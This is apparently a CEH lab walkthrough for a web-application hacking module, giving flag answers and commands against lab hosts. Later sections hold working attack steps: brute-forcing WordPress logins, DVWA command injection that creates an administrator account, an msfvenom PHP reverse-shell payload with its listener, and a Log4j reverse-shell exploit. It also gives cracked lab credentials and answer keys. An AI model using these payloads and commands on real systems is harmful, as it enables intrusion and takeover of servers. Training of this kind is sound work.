# Tasks

## Footprint the Web Infrastructure

### Perform Web Application Reconnaissance using Nmap and Telnet

Perform a port and service discovery scan using Nmap on the website www.moviescope.com. Enter the IP address of the machine hosting [www.moviescope.com](http://www.moviescope.com).

10.10.1.19

```
nmap -T4 -A -v <Target Web Application>
```



Perform a scan using Nmap on the website www.moviescope.com. Enter the name of the DNS server hosting the domain name for [www.moviescope.com](http://www.moviescope.com).

Server2019



Perform banner grabbing using Telnet on the website www.moviescope.com to identify the make, model, and version of the target web-server software. Identify the server-side application used to develop the web pages.

ASP.NET

```
telnet www.moviescope.com 80

GET / HTTP/1.0
```



### Perform Web Application Reconnaissance using WhatWeb

Use the WhatWeb tool to perform website footprinting on the website www.moviescope.com. Enter the Meta-Author name.

EC-Council

```
whatweb <Target Web Application>
```

```
whatweb -v <Target Web Application>
```

```
whatweb --log-verbose=MovieScope_Report www.moviescope.com
```

Use the WhatWeb tool to perform website footprinting on the website www.moviescope.com. Enter the version number of the ASP.NET server-side application used to develop the web pages.

4.0.30319



### Perform Web Spidering using OWASP ZAP

Perform web spidering on the www.moviescope.com website using OWASP ZAP. Enter the name of the tab on the OWASP ZAP application that allows you to view detailed information regarding the URLs obtained while performing web spidering.

Spider



### Detect Load Balancers

Use the dig command to detect the load balancers on the website www.yahoo.com. Enter YES if load balancers are used or NO otherwise.

YES

```
dig yahoo.com
```



Use the lbd tool to detect the load balancers on the website www.yahoo.com. Identify the type of load balancing detected on the website (DNS load balancing or HTTP load balancing).

DNS load balancing

```
lbd yahoo.com
```



### Identify Web Server Directories

Use the Gobuster tool to identify web-server directories on the website www.moviescope.com. Find the number of web-server directories exposed to the Internet.

7

```
gobuster dir -u <Target Website> -w /home/attacker/Desktop/common.txt
```



Use Nmap, Gobuster and Dirsearch tools to identify web server directories on the target website. Enter the option that is used to specify the extension of the file while performing directory bruteforcing on a specific file extension using dirsearch in this task.

```
nmap -sV --script=http-enum <Target domain or IP address>
```

```
python3 dirsearch.py -u http://www.moviescope.com
```

```
python3 dirsearch.py -u http://www.moviescope.com -e aspx
```



Use Nmap, Gobuster and Dirsearch tools to identify web server directories on the target website. Enter the option that is used to specify exclude status code while performing directory bruteforcing on a specific file extension using dirsearch in this task.

\-x

```
python3 dirsearch.py -u http://www.moviescope.com -x 403
```



### Perform Web Application Vulnerability Scanning using Vega

Discover vulnerabilities in the target web application (http://10.10.1.22:8080/dvwa) hosted on Windows Server 2022 using Vega. Enter the port number on which DVWA is hosted .

8080



### Identify Clickjacking Vulnerability

Use ClickjackPoc to identify any clickjacking vulnerability in the website www.moviescope.com hosted by the Windows Server 2019 machine. Enter YES if the website is vulnerable to clickjacking or NO otherwise.

YES

```
echo "http://www.moviescope.com" | tee domain.txt
```

```
python3 clickJackPoc.py -f domain.txt 
```



Identify a clickjacking vulnerability using ClickjackPoc on http://www.moviescope.com. Enter the option that is used to specify the file which contains domain names for scanning.

\-f



## Perform Web Application Attacks

### Perform Brute-force Attack using Burp Suite

Perform a brute-force attack on the WordPress website (http://10.10.1.22:8080/CEH) using Burp Suite. Enter the username/password obtained. Note: username and password files are available at /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist.

admin/qwerty@123

{% hint style="info" %}
Use Intruder and Cluster Bomb in the Burp Suite to brute force the credentials.
{% endhint %}



### Perform Parameter Temparing using Burp Suite

Use Burp Suite to perform parameter tampering on the website www.moviescope.com. Enter the first name of the user associated with the user account ID=2.

john



Use Burp Suite to perform parameter tampering on the website www.moviescope.com. Enter the date of birth of the user associated with the user account ID=4.

20-05-1983



### Identify XSS Vulnerability using PwnXSS

Use the PwnXSS tool to scan the target website for cross-site scripting (XSS) vulnerability. Enter the target url that was used in this task for the scan.

{% embed url="http://testphp.vulnweb.com" %}

```
python3 pwnxss.py -u http://testphp.vulnweb.com
```



Use the PwnXSS tool to scan the target website for cross-site scripting (XSS) vulnerability. Enter the option that is used to specify the target url while performing the scan.

\-u



### Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications&#x20;

Perform parameter tampering on the target web application (www.moviescope.com). Enter the first name of the user associated with the user account ID=4.

steve



Perform parameter tampering on the target web application (www.moviescope.com). Enter the profile ID of kety.

3



### Perform CSRF Attack

Use the WPScan tool to perform a cross-site request forgery (CSRF) attack on a WordPress website (http://10.10.1.22:8080/CEH). Enter the version of the leenkme plugin installed on the WordPress website. Note: use the credentials admin/qwerty@123 to log in to the WordPress website. You need to exploit the leenkme plugin to perform a CSRF attack.

2.5.0



### Enumerate and Hack a Web Application using WPScan and Metasploit

Use the WPScan tool to enumerate usernames on a WordPress website (http://10.10.1.22:8080/CEH). Enter the username obtained.

admin

```
wpscan --api-token <API Token> --url http://10.10.1.22:8080/CEH --enumerate u
```



Use the Metasploit tool to perform a dictionary attack against the web application http://10.10.1.22:8080/CEH and crack the password for the identified username. Enter the cracked password. Note: the password file is available at /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications.

qwerty@123

```
service postgresql start

msfconsole -q

use auxiliary/scanner/http/wordpress_login_enum

show options

set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt

set RHOSTS 10.10.1.22

set RPORT 8080

set TARGETURI http://10.10.1.22:8080/CEH

set USERNAME admin

run

```



### Exploit RCE Vulnerability

Perform command-line execution on a vulnerability found in the DVWA web application (http://10.10.1.22:8080/dvwa/login.php). Enter the hostname of the Windows Server 2022 system. Note: the DVWA login credentials are gordonb/abc123.

Server2022



#### Command Injection Page (Low Mode)

```
| hostname

| whoami

| tasklist

| Taskkill /PID <Process ID> /F
```



Perform command-line execution on a vulnerability found in the DVWA web application (http://10.10.1.22:8080/dvwa/login.php). Enter the number of directories found in the C drive of the Windows Server 2022 system.

8

```
| dir C:\
```

```
| net user

| net user Test /Add

| net user Test

| net localgroup Administrator Test /Add
```



### Exploit File Upload Vulnerability

Exploit a file upload vulnerability at low security levels of DVWA (http://10.10.1.22:8080/dvwa/login.php) using Metasploit. Enter the name of the Windows Server 2022 machine.

SERVER2022

#### Create PHP Payload

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP address> LPORT=4444 -f raw > upload.php
```

{% hint style="info" %}
Upload the php file in DVWA File Upload section&#x20;
{% endhint %}

#### Create a Listener

```
msfconsole

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set LHOST 10.10.1.13

set LPORT 4444

run
```

{% hint style="info" %}
In the Firefox visit the dvwa url:

http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php
{% endhint %}

```
sysinfo
```



### Exploit Log4j Vulnerability

Gain backdoor access by exploiting Log4j vulnerability on an application installed in Ubuntu machine. What is the port number on which the netcat listener was setup in Parrot Security machine in this task?

9001



#### Extract and Setup Jdk

```
tar -xf jdk-8u202-linux-x64.tar.gz

mv jdk1.8.0_202 /usr/bin
```



#### Update the JDK Path in the Poc.py file

{% hint style="info" %}
Change Line no: 62, replace jdk1.8.0\_20/bin/javac with "/usr/bin/jdk1.8.0\_202/bin/javac"

\
Change Line no: 87, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"\
\
Change Line no: 99, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"


{% endhint %}

#### Create a Netcat Listener

```
nc -lvp 9001
```

#### Create a Payload

```
python3 poc.py --userip 10.10.1.13 --webport 8080 --lport 9001
```



{% hint style="info" %}
Copy the send me payload and paste in the username field and enter any random password and press Login
{% endhint %}

#### In the Netcat window

```
whoami
```



## Detect Web Application Vulnerabilities

### N-Stalker Web Application Security Scanner

Detect web application vulnerabilities using N-Stalker Web Application Security Scanner. Flag submission is not required for this task, enter "No flag" as the answer.

No flag

